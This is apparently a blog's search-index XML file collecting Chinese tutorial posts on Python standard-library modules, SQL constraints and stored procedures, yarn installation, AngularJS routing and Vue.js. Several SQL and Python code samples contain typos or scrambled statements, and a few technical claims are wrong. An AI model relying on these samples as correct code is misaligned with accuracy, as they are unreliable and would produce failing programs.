<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title></title>
      <url>%2F2017%2F03%2F30%2FPython%E6%A0%87%E5%87%86%E5%BA%93(1)-%E6%A6%82%E8%A7%88%2F</url>
      <content type="text"><![CDATA[title: Python标准库(1)概览date: 2016-05-26 22:30tags: [‘Python标准库’]toc: truecategories: technology 0x00 概览Python标准库(Standard Library)会随着Python解释器一起安装于电脑，这些标准库是Python的利器，可以让编程事半功倍，我们主要使用标准库中三个方向的包(package): Python增强 系统互动 网络编程 0x01 Python增强 文字处理Python的string类提供了对字符串的处理方法，更进一步，标准库的re包，可以使用正则表达式(regular expression)来处理字符串。此外，Python标准库还为字符串的输出提供更加丰富的格式，比如:string包，textwrap包。 数据对象Pyhton标准库除了定义了如表，词典之外的对象以外，还提供了数组(Array),队列(Queue)等数据对象，此外，我们也经常使用copy包，以复制对象。 日期和时间Python标准库对时间和日期的管理比较完善(利用time包管理时间，利用datatime包管理日期和时间)，可以进行日期和时间的查询和变换，可以对时间进行运算，还可以根据需要控制时间输出的文本格式 数学运算Python中定义了一些新的数字类型(decimal包，fractions包),以弥补之前数字类型可能的不足，同时也包含了random包，用于处理随机数相关的功能，math包也补充了一些重要的数学常数和数学函数 存储Python除了简单文本的输入输出外，还可以输入输出任意的对象。这些对象可以通过标准库中的pickle包转换为二进制格式(binary)，然后存储于文件中，也可以反向从二进制文件中读取对象。 0x02 系统互动主要是指Python和操作系统，文件系统的互动，Python可以实现操作系统的许多功能，能够像bash脚本一样管理操作系统，这也是Python有时被称为脚本语言的原因。 Python运行控制sys包用于管理Python本身的运行环境。其另一个重要的功能是和Python自己的命令行互动，从命令行读取命令和参数。 操作系统os包是Python与操作系统的接口，os包可以实现操作系统的很多功能，但是os包是建立在Linux基础上的，所有许多功能在Windows上是无法实现的。 subprocess包用于执行外部命令，其功能相当于我们在操作系统的命令行中输入命令执行，还可以是可以在命令行中执行的程序。 进程与线程Python支持多线程(threading包)运行和多线程(multiprocessing包)运行。通过多线程和多进程，可以提高系统资源的利用率，提高计算机的处理速度。 网络编程 基于socket层的网络应用socket是网络可编程部分的底层。通过socket包，我们可以直接管理socket，如将socket赋予某个port，连接远程端口，以及通过连接传输数据。我们也可以利用socketserver包方便的建立服务器。此外，通过asyncore包实现异步处理，也是改善服务器性能的一个方案。 互联网应用Python标准库中有http的服务端和客户端的应用支持(BaseHTTPServer包；urllib包；urllib2包)，并且可以通过urlparse包对url进行理解和操作]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[完整性约束]]></title>
      <url>%2F2017%2F03%2F30%2F%E5%AE%8C%E6%95%B4%E6%80%A7%E7%BA%A6%E6%9D%9F%2F</url>
      <content type="text"><![CDATA[0x00 简介约束是用来确保数据的准确性和一致性。数据的完整性就是对数据的准确性和一直性的一种保证。数据完整性(Data Integrity)是指数据的精确性(Accuracy)和可靠性(Reliability)。 数据完整性分为以下四类: 实体完整性:表的每一行在表中是唯一的实体。 参照完整性:两个表的主关键字和外关键字的数据应该一致。 域完整性:表中的列必须满足某种特定的数据类型或者约束 用户自定义完整性 SQL完整性约束分为3种类型，与表有关的约束，域(Domain)约束，断言(Assertion)约束。 与表有关的约束包括列约束和表约束，表约束包括UNIQUE约束，PRIMARY KEY 约束，FOREIGN KEY约束和CHECK约束；列约束除了包括表约束外还包括NOT NULL约束。 0x01 表约束与列约束 NOT NULL and UNIQUENOT NULL代表该列不接受空值；UNIQUE约束列可以接受空值，但是最多只可以出现一个NULL，如果有两行空值，则代表违背了其唯一性原则。 PRIMARY KEY and FOREIGEN KEY主键约束，起唯一标识作用，不能不为NULL，不能重复。值得注意的是，不能为同一个列或一组列即定义UNIQUE约束又定义PRIMARY KEY约束。 创建PRIMARY KEY约束12345CREATE TABLE StudentInfo(Sno INT PREMARY KEY,Name VARCAHRE(20),Address VARCHARE(20) UNIQUE) FOREIGN KEY约束定义了一个表中的数据与另一个表中数据的联系。 FOREIGN KEY指定一个列或者一组列作为外部键，其中，包含外部键的表称为子表，包含外部键所引用的主键的表称为父表。系统保证在外部键的取值要么是父表中某一个主键，要么取空值，确保了实体的参照完整性。 创建FOREIGN KEY约束1234CREATE TABLE Emp_Sal(EMP_ID INT REFERENCES Eminfo (EMP_ID),Salary decimal(5,1),Bank_Account CHAR(8)) EMP_ID被指定为Empty_Sal的外键，参照了Eminfo中的EMP_ID列。此时，表Emp_Sal就是子表，表Eminfo就是父表。如果一个表中有多列创建了FOREIGN KEY约束，将分别于多个表中的相应主键相对应。 关系数据规定子表中的每个FOREIGN KEY值必须作为主键值存在于父表中，该准则为引用完整性约束。 CHECK 约束CHECK约束用来检查字段值所允许的范围。如一个字段只能输入整数，而且只能是1-1000这个范围内的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(10)-多进程信息-multiprocess]]></title>
      <url>%2F2017%2F03%2F30%2Fython%E6%A0%87%E5%87%86%E5%BA%93(10)-%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF-multiprocess%2F</url>
      <content type="text"><![CDATA[0x00 多进程初步subprocess本身就是被设计为一个shell的，而不是一个多进程的管理包，所以它存在两点局限行:1)subprocess总是运行外部的程序，而不是一个python脚本的内部函数；2）经常间只通过管道进行文本交流。 multiprocessing是python中的多进程管理包，与threading.Thread类似可以使用multiprocessing.Process对象来创建一个进程。该进程可以运行python内部编写的函数。与Thread对象一样拥有start(),run(),join()方法。此外，multiprocessing包中也包含有Lock/Event/Seamphore/Condition类，可以看到，multiprocessing包与threading包使用同一套API，但是需要注意以下: multiprocessing提供了threading包中没有的IPC(PIPE和Queue)，效率上可以更高,应该优先使用Pipe和Queue，而避免使用Lock/Event/Semaphore/Condition等同步方式。 多线程中，可以很容易的共享资源，比如全局变量或者传递参数，但是在多进程下，由于每个进程有自己的独立内存空间，以上方法并不使用。但是可以通过共享内存\和Manager方法来共享资源。但是却提高了程序的复杂度并且降低了程序的效率。 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/python# coding:utf-8import osimport threadingimport multiprocessingdef worker(sign, lock): lock.acquire() #使用Lock同步，在一个任务输出以后，再允许另一个任务输出，可以避免多个任务同时向终端输出 print(sign, os.getpid()) lock.release()print(&apos;main&apos;, os.getpid()) #获得进程pidrecord = []lock = threading.Lock()#获得线程锁for i in range(5): thread = threading.Thread(target=worker, args=(&apos;thread&apos;, lock)) thread.start() record.append(thread)for thread in record: thread.join()#join方法，调用该方法的线程将等待直到该Thread对象完成，再恢复运行。#与进程间调用wait()方法类似record = []lock = multiprocessing.Lock()for i in range(5): process = multiprocessing.Process(target=worker, args=(&apos;process&apos;, lock)) process.start() record.append(process)for process in record: process.join() 0x01 Pipe和Queue Pipe和Linux中的管道(PIPE)和消息队列(message queue）一样，multiprocessing包中有Pipe类和Queue类来支持这两种IPC机制。 首先Pipe可以是单向(half-duplex)也可以是双向(duplex)。我们可以通过__multiprocesssing.Pipe(duplex=False)创建单向管道(默认位双向)，单向管道只允许管道一段的进程输入，而双向管道允许从两端输入。 下面是简单的Pipe使用. 1234567891011121314151617181920212223# coding:utf-8import multiprocessing as muldef proc1(pipe): pipe.send(&apos;hello&apos;) print(&apos;proc1rec:&apos;, pipe.recv())def proc2(pipe): print(&apos;proc2rec:&apos;, pipe.recv()) pipe.send(&apos;hello,too&apos;)#创建pipe对象，返回一个含有两个元素的表，每个元素代表pipe的一端pipe = mul.Pipe()p1 = mul.Process(target=proc1, args=(pipe[0],))p2 = mul.Process(target=proc2, args=(pipe[1],))p1.start()p2.start()p1.join()p2.join() QueueQueue和Pipe类似，都是先进先出的结构，但是Queue允许放入/取出多个进程。Queue使用multiprocessing.Queue(Maxsize)来创建。Maxsize表示队列中可以存放的最大对象数量。 1234567891011121314151617181920212223242526272829303132333435363738394041# coding:utf-8import osimport timeimport multiprocessingdef inputQ(queue): info = str(os.getpid()) + &apos;(put):&apos; + str(time.time()) queue.put(info)def outputQ(queue, lock): info = queue.get() lock.acquire() print(str(os.getpid()) + &apos;(get):&apos; + info) lock.release()#main函数record1 = []#存储加入的进程record2 = []#存储输出的进程lock = multiprocessing.Lock()#防止终端输出混淆queue = multiprocessing.Queue(3)#input processfor i in range(10): process = multiprocessing.Process(target=inputQ, args=(queue,)) process.start() record1.append(process)#output processfor i in range(10): process = multiprocessing.Process(target=outputQ, args=(queue, lock)) process.start() record2.append(process)for p in record1: p.joinqueue.close()for p in record2: p.join]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SQL基础概念]]></title>
      <url>%2F2017%2F03%2F30%2F%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%87%BD%E6%95%B0%2F</url>
      <content type="text"><![CDATA[0x00SQL调用例程是一个能被SQL调用的过程和函数。函数和过程都是预先定义的SQL语句，能够执行一定的操作。函数和过程本质上并没有太大的区别。 下面主要以SQL Server中存储过程为例，对于Oracle数据库只做简单介绍。 0x01 SQL Server中的控制流语句 begin—end 语句定义一串由顺序执行的SQL语句构成的块。 IF—ELSE 语句有条件的执行某些语句。 例如在student表中查询学号110学生的成绩状况。12345if (select min(mark) from student where sno=&apos;110&apos;) &gt; 90 pjrint &apos;该生成绩全部优秀&apos;elseif (select min(mark) from student where sno=&apos;110&apos;) &gt; 60 print &apos;该生成绩全部合格&apos; while，break和continue 语句在student表中，如果110学生的平均成绩小于75，则将该生的每门成绩以5%的比例提高，当平均成绩都大于60时，终止操作。 1234567while (select avg (mark) from student where sno=&apos;110&apos;) &lt; 75 begin update student set mark = mark*1.05 if (select min (mark) from student where sno=&apos;110&apos; ) &gt;=60 break end declare 语句declare用来定义一个局部变量，可用select语句为该变量赋值，这个变量必须用@开头跟着一个标识符。 在student表中查询学号110学生的成绩状况123456declare @verygood int select @verygood = min(mark) from student where sno=&apos;110&apos; if @verygood &gt; 60 print &apos;成绩合格&apos; 全局变量在形式上与局部变量不同，它们冠以两个@符号，如@@error。 局部变量的定义和使用必须在同一个存储过程中。 goto label 语句goto label语句用来无条件将语句的执行顺序转到用户定义的标号(label)处，语法如下: 12label1:goto label goto输出四个’hello’1234567declare @count_int intselect @count_int =1restart:print &apos;hello&apos;select @count_int=@count_int+1while @count_int&lt;=4goto restart waitfor用来定义某天中的一个时刻，执行一个语句块。 语法: 1waitfor &#123; delay &apos;time&apos; | time &apos;time&apos; &#125; delay说明了SQL server 执行语句要等待时间。time说明了要等到哪个时刻。 在晚上22:20点执行存储过程uodate_all_stats1234begin waitfor time &apos;22:20&apos; execute updata_all_statsend 0x02 SQL Server中的存储过程和函数在SQL Server中，存储过程分为两类:系统提供的存储过程和用户自定义的存储过程。系统存储过程主要存储在master数据库中，以sp_为前缀，主要是从系统表中获得信息。 主要有: 目录存储过程 复制类存储过程 安全管理类存储过程 分布查询存储过程 创建存储过程Create procedure在SQL Server中我们可以使用Create Procedure创建，编译存储过程。 创建存储过程usp_show_teacher，用于查询所有教师信息 123create procedure usp_show_teacherasselect * from teacher 创建存储过程，usp_select_teacher，查询特定系教师的信息，判断教师的年龄结构并将该系教师的平均年龄和最大年龄传递给用户。 12345678910111213create procedure usp_select_teacher @depart char(10),@avg_age int OUTPUT,@max_avg int OUTPUTasselect * from teacherwhere dname=@departselect @max_age=MAX(AGE)from teacherwhere dname=AVG(AGE)from teacherwhere dname=@dapartif @avg_age&lt;=30select &apos;年龄结构偏轻&apos;,&apos;平均年龄&apos;=@avg_ageif @avg_age &gt;30select &apos;年龄结构合理&apos;,&apos;平均年龄&apos;=@avg_age 其中OUTPUT代表该参数是游标(cursor)数据类型，如果参数为游标类型，则该参数必须被指定为VARING和OUTPUT类型，OUTPUT表明该参数是一个返回参数，可以向调用者返回信息，但是TEXT类型的参数不能用作OUTPUT类型。 execute调用存储过程 123declare @avgage int,@maxage intexecute usp_select_teacher &apos;计算机&apos;,@avgage OUTPUT,@maxge OUTPUTselect @avgage,@maxage/*输出平均年龄与最大年龄*/ 创建函数函数不能执行insert，update和delete操作。SQL Server中有三种类型的自定义函数:标量函数(Scalar Functions)，内联值型函数(Inline Table-valued Functions)，多声明表值型函数(Muti-statement Tabel-valued Functions) 修改和删除存储过程sp_helptext 查看存储过程源代码1sp_helptext sp_name sp_name为存储过程的名称。 sp_rename重命名存储过程1sp_rename old_name,new_name drop删除存储过程1drop sp_name]]></content>
    </entry>

    
    <entry>
      <title></title>
      <url>%2F2017%2F03%2F30%2FPython%E6%A0%87%E5%87%86%E5%BA%93(5)-%E5%AD%98%E5%82%A8%E5%AF%B9%E8%B1%A1(cPickle%E5%8C%85)%2F</url>
      <content type="text"><![CDATA[title: Python表状况(5)-存储对象(cPickle包)date: 2016-05-27 19:36tags: [‘Python标准库’]toc: truecategories: technology 0x00Python中一切皆对象，当Python运行时，对象存储在内存中，随时等待调用，然而内存中的数据会随着计算机的关机而消失，我们有如何将对象保存到文件进而存储在硬盘上？ 我们直接将某个对象所对应位置的数据抓取下来，转换成文本流这个过程叫做(serialize),然后将文本流保存到文件中。而但我们从文本中读取对象时，必须要知道该对象的定义，才能懂得如何去重建这一对象。当然，对于Python的内建对象(built-in)由于其类定义已经载入内存，所以不必再在程序中定义这类。但对于用户自行定义的对象，就必须要先定义类。但是对于用户自定义的类，便必须先定义对象对应的类，才能从文件中载入对象 。 0x01 将内存中的对象转换为文本流12345678910111213#!/usr/bin/python#-*-coding:utf-8-*-import cPickle#定义一个类class bird(object): have_feather = True way_of_reprduction = &apos;egg&apos;summer = bird() #创建一个bird对象fn = &apos;cpickle.txt&apos;with open(fn, &apos;w&apos;) as f: cpicklestring = cPickle.dump(summer, f) 对象summer存储在cpickle.txt文件中 0x02 重建对象从文本中读取文本，存储到字符串中，然后使用cPickle.load()方法将字符串转换成为对象。而此时，程序中必须已经有了该对象的定义。 12345678910111213#!/usr/bin/python#-*-coding:utf-8-*-import cPickleclass bird(object): have_feather = True way_of_reproduction = &apos;egg&apos;fn = &apos;cpickle.txt&apos;with open(fn,&apos;r&apos;) as f: summer = cPickle.load(f) cPickle包的功能与pickle包几乎相同，而cPickle的速度比pickle包快很多。]]></content>
    </entry>

    
    <entry>
      <title></title>
      <url>%2F2017%2F03%2F30%2FPython%E6%A0%87%E5%87%86%E5%BA%93(3)-%E6%97%B6%E9%97%B4%E4%B8%8E%E6%97%A5%E6%9C%9F(time%2Cdatetime)%2F</url>
      <content type="text"><![CDATA[title: Python标准库(3)时间与日期date: 2016-05-11 15:30tags: [‘Python标准库’]toc: truecategories: technology 0x00计算机只会为何一个挂钟时间(wall clock time),这个时间是从某个固定的起点到现在的时间间隔，时间点的选择与计算机相关，但一台计算机而言，这个时间点事固定的，其它日期也是基于此时间点计算而来的。此外计算机还可以测量CPU实际上的运行时间，即处理器时间(processor clock time),以测量计算机性能！ 0x00 time包1234567# -*-coding:utf-8-*-import timeprint(time.time())#挂钟时间，单位:秒print(time.clock())#c处理器时间，单位:秒print(time.gmtime())#返回struct_time格式的UTC时间print(time.localtime())#返回struct_time格式的当地时间print(time.mktime(st))#将struct_time格式转换成wall clock time 0x02 datetime包datetime包是基于time的高级包，可以理解为两部分time包(对应datetime.date类)和date包(对应datetime.time类)，只讲datetime.datetime类。 123456# -*-coding:utf-8-*-import datetimet = datetime.datetime(2016,5,12,19,31)print(t)输出:2016-05-12 19:31:00 所有返回的t包含的属性有:hour, minute, second, microsecond(微秒), year, month, day, weekday(周几) 运算 datetime包还定义了时间间隔对象(timedelta),一个时间点(datetime)加上一个时间间隔(timedelta)可以得到一个新的时间点(datetime),同理，两个时间点相减会得到一个时间间隔。 1234567891011import datetimet = datetime.datetime(2016,5,12,19,31)t_next = datetime.datetime(2016,5,22,18,23)deltal1 = datetime.timedelta(seconds = 4000)deltal2 = datetime.timedelta(weeks = 4)print(t+deltal1)print(t+deltal2)输出:2016-05-12 20:37:402016-06-09 19:31:00 datetime.timedelta的参数可以是seconds, weeks, days, hours, milliseconds, miroseconds.datetime对象之间还可以进行比较12print(t &gt; t_next)返回:False datetime对象与字符串转换 一种方法是使用格式化读取的方式读取时间信息12345678910# -*-coding:utf-8-*-from datetime import datetimeformat = &quot;output-%Y-%m-%d-%H%M%S.txt&quot;str = &quot;output-1992-3-21-203234.txt&quot;t = datetime.strptime(str, format)print t输出:1992-03-21 20:32:34 也可以反过来调用datetime的strftime()方法将datetime对象装换为特定格式的字符串123print(t.strftime(format))输出:output-1992-03-21-203234.txt]]></content>
    </entry>

    
    <entry>
      <title></title>
      <url>%2F2017%2F03%2F30%2F%E9%97%AE%E9%A2%98%2F</url>
      <content type="text"><![CDATA[如何解决跨域问题，Ajax? 如何解决 DOM 事件在 IE 中的作用域问题 前端动画问题，JS原生动画，CSS3 动画，Canva动画，CSS3 动画使用 CPU 渲染，可以与 JS 线程分开，但是存在兼容性问题，各有利弊，说说 Canvas 动画的问题。 zpote 移动端 jQuery 框架？？ jQuery的问题，fn 和 extend 待解决: 1.require.js 实践操作?2.AMD,CMD,UMD,CommonJS?3.jQuery 源码?]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[yarn初步]]></title>
      <url>%2F2017%2F03%2F26%2Fyarn%E5%88%9D%E6%AD%A5%2F</url>
      <content type="text"><![CDATA[0x00 0x01 安装在 Linux 环境下直接使用 apt-get 来安装: 首先配置 repository： 12sudo apt-key adv --keyserver pgp.mit.edu --recv D101F7899D41F3C3echo &quot;deb http://dl.yarnpkg.com/debian/ stable main&quot; | sudo tee /etc/apt/sources.list.d/yarn.list 安装 Yarn 之前，需要最新版本的 Node，支持，如果系统中安装了多个不同版本的 node，那么可以使用 nvm先指定系统默认的 node 版本: 12nvm alias default 7default -&gt; 7 (-&gt; v7.5.0) 安装 Yarn: 1apt-get update &amp;&amp; apt-get install yarn 或者，你已经安装了 Node.js,那么还可以通过 npm 来安装 yarn(但是，强烈不建议这种方式): 1npm i -g yarn 最后，为 Yarn 配置环境变量: 添加 export PATH=”$PATH:`yarn global bin`“ 到你的配置文件 (这可能在你的 .profile, .bashrc, .zshrc 等文件里) 当然，最后不要忘了激活配置: 1$ source .zshrc yarn中文网 0x02 从 npm 迁移到 yarn]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux-PID进程追踪]]></title>
      <url>%2F2017%2F03%2F17%2FLinux-PID%E8%BF%9B%E7%A8%8B%E8%BF%BD%E8%B8%AA%2F</url>
      <content type="text"><![CDATA[0x00 Shadowsocks关于 shadowsocks 不只能正常运行的一次pid进程追踪: 12345678910: 1463919806:0;ps -aux: 1463919844:0;lsof -p 4468: 1463919891:0;cat /root/.config/shadowsocks-gui/Local\ Storage/file__0.localstorage: 1463919909:0;vim /root/.config/shadowsocks-gui/Local\ Storage/file__0.localstorage: 1463919935:0;cd /root/.config/shadowsocks-gui: 1463919935:0;ls: 1463919941:0;cd Local\ Storage: 1463920055:0;rm file__0.localstorage: 1463920057:0;rm file__0.localstorage-journal: 1463920062:0;./start.sh]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AngularJS深入(1)之ui.router]]></title>
      <url>%2F2017%2F03%2F03%2FAngularJS%E6%B7%B1%E5%85%A5(1)%E4%B9%8Bui-router%2F</url>
      <content type="text"><![CDATA[0x00 ngRoute VS ui.routerAngularJS 原生的路由mok ngRoute 只是提供了最基本的路由功能在很多实际的使用场景中的表现并不理想。庆幸的是 AngularJS 开发团队设计了 ui.router 这个第三方库来弥补原生路由的不足。 两者的区别在于，ui.router 是基于 state(状态) 的，它通过状态填充某一部件 ， ngRoute 是基于 url，它通过指令填充某一部件。ui.router 模块具有更强大的功能，主要体现在视图的嵌套方面。 ngRoute使用 ngRoute 配置路由过程如下: 1234567let app = angular.module(&apos;app&apos;, [&apos;ngRoute&apos;]);app.config([&apos;$routerProvider&apos;, function($routerProvider)&#123; $routerProvider.when(&apos;/main&apos;,&#123; templateUrl: &apos;main.html&apos;, controller: ;MainCtrl&apos;&#125;).otherwise(&#123; redirectTo: &apos;/tabs&apos;&#125;);&#125;]) ngRoute 中的服务与指令如下: ngRoute: 路由模块名 $routerProvider: 服务提供者，用来定义一个路由表，即地址栏与视图模板的映射，对应于 ui.router 中的 urlRouterProvider 和 stateProvider $route 服务:完成路由匹配，并且提供路由相关的属性访问及事件，如访问当前路由对应的 Controller，对应于下面的 $urlRouter 和 $state $routeParams: 服务，保存了地址栏中的参数，对应于下面的 $stateParams ng-view 指令: 用来在主视图中指定加载子视图的区域，对应于下面的 ui-view。 ui.router其基本的路由配置如下: 12345678myApp.config([&apos;$stateProvider&apos;,&apos;$urlRouterProvider&apos;,function ($stateProvider, $urlRouterProvider) &#123;$urlRouterProvider.otherwise(&apos;/globalBuy&apos;);$stateProvider .state(&quot;Main&quot;, &#123; url: &quot;/main&quot;, templateUrl: &quot;main.html&quot;, controller: &apos;MainCtrl&apos; &#125;) ui.router 中的服务与指令如下: ui.router 路由模块名 $urlRouterProvider: 服务提供者，用来配置路由重定向 $stateProvider: 服务提供者，用来配置路由 $urlRouter: 服务 $state: 服务，用来显示当前路由状态信息，以及一些路由方法（如：跳转） $stateParams: 服务，用来存储路由匹配时的参数 ui-view: 指令，路由模板渲染，对应的 dom 相关联 ui-sref: 指令，链接到特定状态]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Vue.j(进阶)自定义指令]]></title>
      <url>%2F2017%2F02%2F18%2FVue-js(%E8%BF%9B%E9%98%B6)%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4%2F</url>
      <content type="text"><![CDATA[0x00同样 Vue 允许我们自定义指令，以再必要的情况下实现对原生 DOM 的操作。 Vue 提供了 deirevtice 注册全局指令，directives 注册局部指令。 1234567891011121314151617181920212223242526&lt;div id=&quot;demo&quot;&gt; &lt;input type=&quot;text&quot; v-focus v-warn&gt; &lt;!--使用 自定义指令--&gt;&lt;/div&gt;Vue.directive(&apos;focus&apos;,&#123; // 注册一个全局的指令 focus inserted: function (el) &#123;// inserted: 钩子函数，被绑定元素插入到父节点时调用// el：钩子函数的参数，代表指令所绑定的元素，可以直接用来操作 DOM el.focus() &#125;&#125;)new Vue(&#123; el: &apos;#demo&apos;, directives: &#123; // 局部指令 warn: &#123;// 注册一个局部指令 warn inserted: function (el) &#123;// el.style.border = &apos;2px solid red&apos; &#125; &#125; &#125;&#125;) 0x01 钩子函数除了 inserted 函数外， Vue 还提供了其它几个钩子函数: bind: 只调用一次，当指令第一次被绑定到元素时调用。 inserte: 被绑定元素插入父节点时调用（父节点存在即可调用，不必存在于 document 中）。 update: 被绑定元素所在的模板更新时调用，而不论绑定值是否变化。通过比较更新前后的绑定值，可以忽略不必要的模板更新。 componentUpdated: 被绑定元素所在模板完成一次更新周期时调用。 unbind: 只调用一次，指令与元素解绑时调用。 以上所有钩子函数都接受四个钩子函数的参数，el, binding, vnod,oldVnode(仅在 update 和 componentUpdated 钩子中可用)。 el: 指令所绑定的元素。 binding: 一个对象，包含如下属性: name: 指令名，不包括 v- 前缀。 value: 指令绑定的属性值。 oldValue: 指令绑定的前一个值，仅在 update 和 componentUpdate 中可用。 arg: 传给指令的参数。v-my-direvtive:foo ，arg=foo。 expression: 绑定值的字符串形式 modifiers： 一个包含修饰符对象 vnode: Vue 编译生产的虚拟节点。 oldVnode: 上一个虚拟节点。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Vue.js概览]]></title>
      <url>%2F2017%2F02%2F18%2FVue-js%E6%A6%82%E8%A7%88%2F</url>
      <content type="text"><![CDATA[0x00 计算属性computed vs methods为了处理某些复杂逻辑，Vue 提供了 computed (计算属性)，它和 methods 是类似的，但是 计算属性是基于它的依赖缓存的 计算属性只有在它的相关依赖发生改变时才会重新取值。而 methods 在每次重新渲染的时候就会被调用并执行。 123456789101112131415161718192021222324&lt;label&gt;computedReverseMsg:&lt;/label&gt;&lt;p&gt;&#123;&#123;computedReverseMsg&#125;&#125;&lt;/p&gt;// olleh&lt;label for=&quot;&quot;&gt;methodsReverseMsg:&lt;/label&gt;&lt;p&gt;&#123;&#123;methodsReverseMsg()&#125;&#125;&lt;/p&gt;// dlrownew Vue(&#123; el: &apos;#demo&apos;, data: &#123; firstMessage: &apos;hello&apos;, secondMessage: &apos;world&apos; &#125;, computed: &#123; computedReverseMsg: function () &#123; return this.firstMessage.split(&apos;&apos;).reverse().join(&apos;&apos;); &#125; &#125;, methods: &#123; methodsReverseMsg :function ()&#123; return this.secondMessage.split(&apos;&apos;).reverse().join(&apos;&apos;); &#125; &#125;&#125;) 如上， computed 和 methods所实现的效果是一样的，在这个例子中没有任何区别。但是，如果我们有多个属性依赖同一个巨大体量的数据源时 A，使用 computed 的性能会更好，因为事先将 A 缓存起来了，这意味着未来不用多次调用 A 的 getter。 computed vs $watch与 AngularJS 类似，Vue 中的 $watch 应用于监听 Vue 实例上的数据变化。$watch 和 computed 都能响应数据的变化。但是，相比之下 $watch 方法更适合在响应数据变化，执行异步或开销较大的操作是使用，因为这可以让我们在中间态中进行额外的业务处理。 计算 setter计算属性默认只会提供 getter，但我们也可以显示式指定一个 setter： 下面是官网的 Demo: 12345678910111213141516171819202122let vm1 = new Vue(&#123; el: &apos;#dmeoComp&apos;, data: &#123; firstName: &apos;Foo&apos;, lastName: &apos;Bar&apos;, fullName: &apos;Foo Bar&apos;&#125;,computed: &#123; fullName: &#123; //getter get: function () &#123; return this.firstName + &apos; &apos; + this.lastName&#125;,//setter set: function (newValue) &#123; let names = newValue.split(&apos; &apos;); this.firstName = names[0]; this.lastName = names[names.length -1]; &#125; &#125;&#125;&#125;) 运行 vm1.fullName = &#39;jack haha&#39; 时, vm1.firstName 和 vm1.lastName 也会更新。 0x01 Class 与 StyleVue 中可以使用 v-bind 来将字符串，对象,数组甚至计算属性绑定到元素的 class 或者 style。 绑定对象123456789101112131415161718192021222324&lt;div :class=&quot;classObject&quot;&gt;&lt;/div&gt;// 修饰符 ‘:’ 是 `v-bind` 的缩写// &lt;div v-bind=&quot;classObject&quot;&gt;&lt;/div&gt; 效果一样//绑定对象data: &#123; classObject: &#123; active: true, &apos;text-danger&apos;: flase&#125;&#125;//绑定计算属性data: &#123; isActice: true, error: null&#125;,computed: &#123; classObject: function ()&#123; return &#123; active: this.isActive &amp;&amp; this.error, &apos;text-dange&apos;: this.error &amp;&amp; this.error.type === &apos;fatal&apos;&#125;&#125;&#125; 绑定数组123456789&lt;div :class=&quot;[activeClass, errorClass]&quot;&gt;&lt;/div&gt;data: &#123; activeClass: &apos;active, errorClass: &apos;text-dange&apos;&#125;//或者，直接在数组中使用对象语法&lt;div :class=&quot;[&#123; active: isActive&#125;, errorClass]&quot;&gt;&lt;/div&gt; 而对于内联的 style，Vue 中使用 CSS 对象语法，其 CSS 属性名可以用驼峰式（camelCase）或短横分隔命名（kebabl-case),其用法与 class 绑定是类似的。 使用 v-bind:style时 Vue 会自动添加 CSS 前缀。 0x02 条件渲染Vue 提供了 v-if,v-else-if,v-else 等指令以方便进行条件渲染，同时结合 &lt;template&gt; 元素（最终渲染结果不会包含它）使用起来异常方便。 123456789&lt;template v-if=&quot;ok&quot;&gt; &lt;p&gt;Paragraph 1&lt;/p&gt; &lt;/template&gt;&lt;template v-else-if&gt; &lt;p&gt;Paragraph 2&lt;/p&gt;&lt;/template&gt;&lt;template v-else&gt; &lt;p&gt;Paragraph 3&lt;/p&gt;&lt;/template&gt; key 特性为了尽可能的高效渲染元素，Vue 会最大限度的重用已经渲染出来的元素，但是有时这种机制并不适用。如果不想重用元素，则可以为元素指定一个唯一的 key 值: 1234&lt;template v-if=&quot;loginType === &apos;username&apos;&gt; &lt;label&gt;Username:&lt;/label&gt; &lt;input placeholder=&quot;Enter your username&quot; key=&quot;username-input&quot;/&gt;&lt;/template&gt; v-if VS v-show被指定 v-show 的元素会被始终渲染并保持在 DOM 中， 它只是简单的切换 CSS 的 display样式而已。 v-if 是真实的条件渲染，因为它会确保条件块在切换当中适当地销毁与重建条件块内的事件监听器和子组件。 v-if 有更高的切换消耗而 v-show 有更高的初始渲染消耗。因此，如果需要频繁切换,那么使用 v-show 较好，如果在运行时条件不大可能改变则使用 v-if 较好。 v-show 不支持 &lt;template&gt; 语法。 0x03 列表渲染v-forv-for 块具有对父级作用域属性的完全访问权限，其语法形式如下: 123&lt;div v-for=&quot;item in items&gt;&lt;/div&gt;//or &lt;div v-for=&quot;item of items&quot;&gt;&lt;/div&gt; 是的，Vue 支持 in 或 of 的语法形式，item 是迭代数据源中元素的别名。 对象迭代v-for 可以通过对象的属性进行迭代: 12345678910111213141516&lt;ul id=&quot;repeat-object&quot;&gt; &lt;li v-for=&quot;(value, key, index) in object&quot;&gt; &#123;&#123;value&#125;&#125;.&#123;&#123;key&#125;&#125;.&#123;&#123;index&#125;&#125; &lt;/li&gt;&lt;/ul&gt;new Vue(&#123; el: &apos;#repeat-object&apos;, data: &#123; object: &#123; FirstName: &apos;John&apos;, LastName: &apos;Doe&apos;, Age: 30 &#125; &#125;&#125;) 组件和 v-forv-for 可以结合 &lt;template&gt; 元素或者自定义组件来使用。不过在组件的结合中，Vue 为了解耦合，数据是不能自动注入到组件里的，因为每个组件都有自己独立的作用域，如果想传递迭代数据到组件，需要在子组件创建时定义 props ，下面是官网的 Demo: 123456789101112131415161718Vue.component(&apos;todo-item&apos;, &#123; template: &apos;\ &lt;li&gt;\ &#123;&#123; title &#125;&#125;\ &lt;button v-on:click=&quot;$emit(\&apos;remove\&apos;)&quot;&gt;X&lt;/button&gt;\ &lt;/li&gt;\ &apos;, props: [&apos;title&apos;]&#125;)&lt;ul&gt; &lt;li is=&quot;todo-item&quot; v-for=&quot;(todo, index) in todos&quot; v-bind:title=&quot;todo&quot; v-on:remove=&quot;todos.splice(index, 1)&quot; &gt;&lt;/li&gt; &lt;/ul&gt; 数组扩展Vue 